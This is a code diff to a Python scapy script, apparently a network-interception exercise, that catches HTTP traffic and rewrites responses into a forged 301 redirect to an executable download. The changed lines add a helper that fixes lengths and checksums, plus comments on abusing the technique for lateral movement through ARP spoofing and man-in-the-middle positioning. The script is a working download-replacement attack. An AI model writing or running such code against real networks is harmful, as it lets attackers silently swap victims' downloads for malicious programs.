@@ -7,6 +7,14 @@ import scapy.all as scapy
 
 ack_list = []
 
+def set_load(packet, load):
+    packet[scapy.Raw].load = load
+    #Removes the len and checksums from the packet to allow scapy to auto-recalculate them.
+    del packet[scapy.IP].len
+    del packet[scapy.IP].chksum
+    del packet[scapy.TCP].chksum
+    return packet
+
 def process_packet(packet):
     scapy_packet = scapy.IP(packet.get_payload())
     if scapy_packet.haslayer(scapy.Raw):
@@ -29,12 +37,11 @@ def process_packet(packet):
                 #Don't really need to print this but left it for reference.
                 print(scapy_packet.show())
                 #File to be redirected to. Added \n\n to the end to enforce it to browse to the location without any additional data being appended from the load.
-                scapy_packet[scapy.Raw].load = "HTTP/1.1 301 Moved Permanently\nLocation: https://notepad-plus-plus.org/repository/7.x/7.7.1/npp.7.7.1.Installer.exe\n\n"
-                #Removes the len and checksums from the packet to allow scapy to auto-recalculate them.
-                del scapy_packet[scapy.IP].len
-                del scapy_packet[scapy.IP].chksum
-                del scapy_packet[scapy.TCP].chksum
-                packet.set_payload(str(scapy_packet))
+                #Below it shows how to link to a .exe file hosted online. This can be abused to allow for lateral movement by referencing an internal web server/IP via MITM and ARP spoofing.
+                #If you attempt MITM variabtion, don't forget to enable IP forwarding otherwise packets won't flow properly!
+                modified_packet = set_load(scapy_packet, "HTTP/1.1 301 Moved Permanently\nLocation: https://notepad-plus-plus.org/repository/7.x/7.7.1/npp.7.7.1.Installer.exe\n\n")
+
+                packet.set_payload(str(modified_packet))
 
     packet.accept()
 
